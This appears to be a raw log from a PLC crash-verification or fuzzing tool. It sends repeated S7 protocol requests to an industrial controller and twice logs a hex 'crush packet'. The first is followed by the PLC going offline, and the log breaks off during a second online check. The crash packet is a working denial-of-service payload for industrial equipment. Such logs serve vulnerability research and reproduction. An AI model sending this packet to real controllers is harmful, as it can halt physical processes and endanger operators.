[2021-12-19 20:33:46,997] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 20:33:46,998] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:33:47,148] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect request]0300001902f08032010000010000080000f000000a000a00f0
[2021-12-19 20:33:47,149] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300000100000800000000f0000003000300f0
[2021-12-19 20:33:47,149] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 46
[2021-12-19 20:33:47,151] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000200000800080001120411440100ff090004001c0000
[2021-12-19 20:33:47,359] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000300000800080001120411440100ff090004001c0000
[2021-12-19 20:33:47,567] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000400000800080001120411440100ff090004001c0000
[2021-12-19 20:33:47,771] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000500000800080001120411440100ff090004001c0000
[2021-12-19 20:33:47,974] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000600000800080001120411440100ff090004001c0000
[2021-12-19 20:33:48,180] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000700000800080001120411440100ff090004001c0000
[2021-12-19 20:33:48,385] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000800000800080001120411440100ff090004001c0000
[2021-12-19 20:33:48,592] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000900000800080001120411440100ff090004001c0000
[2021-12-19 20:33:48,794] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000a00000800080001120411440100ff090004001c0000
[2021-12-19 20:33:48,999] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000b00000800080001120411440100ff090004001c0000
[2021-12-19 20:33:49,204] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000c00000800080001120411440100ff090004001c0000
[2021-12-19 20:33:49,410] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000d00000800080001120411440100ff090004001c0000
[2021-12-19 20:33:49,614] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000e00000800080001120411440100ff090004001c0000
[2021-12-19 20:33:49,821] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000f00000800080001120411440100ff090004001c0000
[2021-12-19 20:33:50,027] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001000000800080001120411440100ff090004001c0000
[2021-12-19 20:33:50,230] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001100000800080001120411440100ff090004001c0000
[2021-12-19 20:33:50,433] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001200000800080001120411440100ff090004001c0000
[2021-12-19 20:33:50,639] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001300000800080001120411440100ff090004001c0000
[2021-12-19 20:33:50,843] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001400000800080001120411440100ff090004001c0000
[2021-12-19 20:33:51,051] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001500000800080001120411440100ff090004001c0000
[2021-12-19 20:33:51,258] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001600000800080001120411440100ff090004001c0000
[2021-12-19 20:33:51,474] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001700000800080001120411440100ff090004001c0000
[2021-12-19 20:33:51,689] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001800000800080001120411440100ff090004001c0000
[2021-12-19 20:33:51,894] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001900000800080001120411440100ff090004001c0000
[2021-12-19 20:33:52,111] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001a00000800080001120411440100ff090004001c0000
[2021-12-19 20:33:52,317] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001b00000800080001120411440100ff090004001c0000
[2021-12-19 20:33:52,520] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001c00000800080001120411440100ff090004001c0000
[2021-12-19 20:33:52,723] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001d00000800080001120411440100ff090004001c0000
[2021-12-19 20:33:52,930] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001e00000800080001120411440100ff090004001c0000
[2021-12-19 20:33:53,133] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001f00000800080001120411440100ff090004001c0000
[2021-12-19 20:33:53,341] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002000000800080001120411440100ff090004001c0000
[2021-12-19 20:33:53,546] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002100000800080001120411440100ff090004001c0000
[2021-12-19 20:33:53,752] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002200000800080001120411440100ff090004001c0000
[2021-12-19 20:33:53,969] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002300000800080001120411440100ff090004001c0000
[2021-12-19 20:33:54,186] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002400000800080001120411440100ff090004001c0000
[2021-12-19 20:33:54,404] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002500000800080001120411440100ff090004001c0000
[2021-12-19 20:33:54,611] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002600000800080001120411440100ff090004001c0000
[2021-12-19 20:33:54,815] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002700000800080001120411440100ff090004001c0000
[2021-12-19 20:33:55,021] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002800000800080001120411440100ff090004001c0000
[2021-12-19 20:33:55,225] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002900000800080001120411440100ff090004001c0000
[2021-12-19 20:33:55,428] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002a00000800080001120411440100ff090004001c0000
[2021-12-19 20:33:55,632] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002b00000800080001120411440100ff090004001c0000
[2021-12-19 20:33:55,838] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002c00000800080001120411440100ff090004001c0000
[2021-12-19 20:33:56,044] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002d00000800080001120411440100ff090004001c0000
[2021-12-19 20:33:56,249] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002e00000800080001120411440100ff090004001c0000
[2021-12-19 20:33:56,466] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002f00000800080001120411440100ff090004001c0000
[2021-12-19 20:33:57,081] [INFO] [verifyClient.send_s7_packet] -> Send the crush packet
[2021-12-19 20:33:57,082] [INFO] [verifyClient.send_s7_packet] -> [request]0300001f02f080320100003000000e00000401120a10010003000083000001
[2021-12-19 20:33:57,296] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003100000800080001120411440100ff090004001c0000
[2021-12-19 20:33:57,501] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003200000800080001120411440100ff090004001c0000
[2021-12-19 20:33:57,718] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003300000800080001120411440100ff090004001c0000
[2021-12-19 20:33:57,920] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003400000800080001120411440100ff090004001c0000
[2021-12-19 20:33:58,124] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003500000800080001120411440100ff090004001c0000
[2021-12-19 20:33:58,330] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003600000800080001120411440100ff090004001c0000
[2021-12-19 20:33:58,537] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003700000800080001120411440100ff090004001c0000
[2021-12-19 20:33:58,754] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003800000800080001120411440100ff090004001c0000
[2021-12-19 20:33:58,960] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003900000800080001120411440100ff090004001c0000
[2021-12-19 20:33:59,167] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003a00000800080001120411440100ff090004001c0000
[2021-12-19 20:33:59,375] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003b00000800080001120411440100ff090004001c0000
[2021-12-19 20:33:59,579] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003c00000800080001120411440100ff090004001c0000
[2021-12-19 20:33:59,782] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003d00000800080001120411440100ff090004001c0000
[2021-12-19 20:33:59,988] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003e00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:00,191] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003f00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:00,395] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004000000800080001120411440100ff090004001c0000
[2021-12-19 20:34:00,600] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004100000800080001120411440100ff090004001c0000
[2021-12-19 20:34:00,808] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004200000800080001120411440100ff090004001c0000
[2021-12-19 20:34:01,015] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004300000800080001120411440100ff090004001c0000
[2021-12-19 20:34:01,223] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004400000800080001120411440100ff090004001c0000
[2021-12-19 20:34:01,425] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004500000800080001120411440100ff090004001c0000
[2021-12-19 20:34:01,640] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004600000800080001120411440100ff090004001c0000
[2021-12-19 20:34:01,846] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004700000800080001120411440100ff090004001c0000
[2021-12-19 20:34:02,053] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004800000800080001120411440100ff090004001c0000
[2021-12-19 20:34:02,260] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004900000800080001120411440100ff090004001c0000
[2021-12-19 20:34:02,465] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004a00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:02,670] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004b00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:02,877] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004c00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:03,094] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004d00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:03,300] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004e00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:03,504] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004f00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:03,710] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005000000800080001120411440100ff090004001c0000
[2021-12-19 20:34:03,917] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005100000800080001120411440100ff090004001c0000
[2021-12-19 20:34:04,124] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005200000800080001120411440100ff090004001c0000
[2021-12-19 20:34:04,329] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005300000800080001120411440100ff090004001c0000
[2021-12-19 20:34:04,535] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005400000800080001120411440100ff090004001c0000
[2021-12-19 20:34:04,738] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005500000800080001120411440100ff090004001c0000
[2021-12-19 20:34:04,943] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005600000800080001120411440100ff090004001c0000
[2021-12-19 20:34:05,160] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005700000800080001120411440100ff090004001c0000
[2021-12-19 20:34:05,223] [INFO] [vertifyPassiveARP.passiveCallback] -> passiveDetect find a Crush
[2021-12-19 20:34:05,363] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:34:17,393] [INFO] [verifyClient.activeDetect] -> the PLC is offline
[2021-12-19 20:34:17,394] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 86 ,passiveDetected find a Crush, The activeDetect ans is Crush
[2021-12-19 20:34:25,659] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:34:25,688] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect request]0300001902f08032010000580000080000f000000a000a00f0
[2021-12-19 20:34:25,688] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300005800000800000000f0000003000300f0
[2021-12-19 20:34:27,691] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 56
[2021-12-19 20:34:27,698] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005900000800080001120411440100ff090004001c0000
[2021-12-19 20:34:27,908] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:34:27,919] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 20:34:27,919] [INFO] [vertifyPassiveARP.<module>] -> No: 2, sended packets 1 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 20:34:27,920] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 20:34:27,921] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005a00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:28,129] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005b00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:28,331] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005c00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:28,536] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005d00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:28,742] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005e00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:28,946] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005f00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:29,151] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006000000800080001120411440100ff090004001c0000
[2021-12-19 20:34:29,357] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006100000800080001120411440100ff090004001c0000
[2021-12-19 20:34:29,574] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006200000800080001120411440100ff090004001c0000
[2021-12-19 20:34:29,781] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006300000800080001120411440100ff090004001c0000
[2021-12-19 20:34:29,984] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006400000800080001120411440100ff090004001c0000
[2021-12-19 20:34:30,189] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006500000800080001120411440100ff090004001c0000
[2021-12-19 20:34:30,404] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006600000800080001120411440100ff090004001c0000
[2021-12-19 20:34:30,610] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006700000800080001120411440100ff090004001c0000
[2021-12-19 20:34:30,828] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006800000800080001120411440100ff090004001c0000
[2021-12-19 20:34:31,031] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006900000800080001120411440100ff090004001c0000
[2021-12-19 20:34:31,234] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006a00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:31,440] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006b00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:31,643] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006c00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:31,850] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006d00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:32,052] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006e00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:32,259] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006f00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:32,462] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007000000800080001120411440100ff090004001c0000
[2021-12-19 20:34:32,668] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007100000800080001120411440100ff090004001c0000
[2021-12-19 20:34:32,871] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007200000800080001120411440100ff090004001c0000
[2021-12-19 20:34:33,079] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007300000800080001120411440100ff090004001c0000
[2021-12-19 20:34:33,282] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007400000800080001120411440100ff090004001c0000
[2021-12-19 20:34:33,485] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007500000800080001120411440100ff090004001c0000
[2021-12-19 20:34:33,702] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007600000800080001120411440100ff090004001c0000
[2021-12-19 20:34:33,907] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007700000800080001120411440100ff090004001c0000
[2021-12-19 20:34:34,115] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007800000800080001120411440100ff090004001c0000
[2021-12-19 20:34:34,332] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007900000800080001120411440100ff090004001c0000
[2021-12-19 20:34:34,538] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007a00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:34,743] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007b00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:34,949] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007c00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:35,155] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007d00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:35,358] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007e00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:35,565] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007f00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:35,769] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008000000800080001120411440100ff090004001c0000
[2021-12-19 20:34:35,972] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008100000800080001120411440100ff090004001c0000
[2021-12-19 20:34:36,176] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008200000800080001120411440100ff090004001c0000
[2021-12-19 20:34:36,381] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008300000800080001120411440100ff090004001c0000
[2021-12-19 20:34:36,588] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008400000800080001120411440100ff090004001c0000
[2021-12-19 20:34:36,791] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008500000800080001120411440100ff090004001c0000
[2021-12-19 20:34:36,995] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008600000800080001120411440100ff090004001c0000
[2021-12-19 20:34:37,200] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008700000800080001120411440100ff090004001c0000
[2021-12-19 20:34:37,404] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008800000800080001120411440100ff090004001c0000
[2021-12-19 20:34:37,611] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008900000800080001120411440100ff090004001c0000
[2021-12-19 20:34:37,815] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008a00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:38,020] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008b00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:38,222] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008c00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:38,427] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008d00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:38,634] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008e00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:38,837] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008f00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:39,042] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009000000800080001120411440100ff090004001c0000
[2021-12-19 20:34:39,556] [INFO] [verifyClient.send_s7_packet] -> Send the crush packet
[2021-12-19 20:34:39,558] [INFO] [verifyClient.send_s7_packet] -> [request]0300001f02f080320100009100000e00000401120a10010003000083000001
[2021-12-19 20:34:39,764] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009200000800080001120411440100ff090004001c0000
[2021-12-19 20:34:39,967] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009300000800080001120411440100ff090004001c0000
[2021-12-19 20:34:40,174] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009400000800080001120411440100ff090004001c0000
[2021-12-19 20:34:40,378] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009500000800080001120411440100ff090004001c0000
[2021-12-19 20:34:40,583] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009600000800080001120411440100ff090004001c0000
[2021-12-19 20:34:40,787] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009700000800080001120411440100ff090004001c0000
[2021-12-19 20:34:40,993] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009800000800080001120411440100ff090004001c0000
[2021-12-19 20:34:41,195] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009900000800080001120411440100ff090004001c0000
[2021-12-19 20:34:41,403] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009a00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:41,610] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009b00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:41,828] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009c00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:42,035] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009d00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:42,240] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009e00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:42,447] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009f00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:42,663] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a000000800080001120411440100ff090004001c0000
[2021-12-19 20:34:42,868] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a100000800080001120411440100ff090004001c0000
[2021-12-19 20:34:43,073] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a200000800080001120411440100ff090004001c0000
[2021-12-19 20:34:43,279] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a300000800080001120411440100ff090004001c0000
[2021-12-19 20:34:43,482] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a400000800080001120411440100ff090004001c0000
[2021-12-19 20:34:43,689] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a500000800080001120411440100ff090004001c0000
[2021-12-19 20:34:43,895] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a600000800080001120411440100ff090004001c0000
[2021-12-19 20:34:44,102] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a700000800080001120411440100ff090004001c0000
[2021-12-19 20:34:44,309] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a800000800080001120411440100ff090004001c0000
[2021-12-19 20:34:44,515] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a900000800080001120411440100ff090004001c0000
[2021-12-19 20:34:44,719] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000aa00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:44,922] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ab00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:45,140] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ac00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:45,345] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ad00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:45,548] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ae00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:45,753] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000af00000800080001120411440100ff090004001c0000
[2021-12-19 20:34:45,957] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b000000800080001120411440100ff090004001c0000
[2021-12-19 20:34:46,162] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b100000800080001120411440100ff090004001c0000
[2021-12-19 20:34:46,368] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b200000800080001120411440100ff090004001c0000
[2021-12-19 20:34:46,570] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b300000800080001120411440100ff090004001c0000
[2021-12-19 20:34:46,774] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b400000800080001120411440100ff090004001c0000
[2021-12-19 20:34:46,978] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b500000800080001120411440100ff090004001c0000
[2021-12-19 20:34:47,185] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b600000800080001120411440100ff090004001c0000
[2021-12-19 20:34:47,391] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b700000800080001120411440100ff090004001c0000
[2021-12-19 20:34:47,596] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b800000800080001120411440100ff090004001c0000
[2021-12-19 20:34:47,722] [INFO] [vertifyPassiveARP.passiveCallback] -> passiveDetect find a Crush
[2021-12-19 20:34:47,800] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
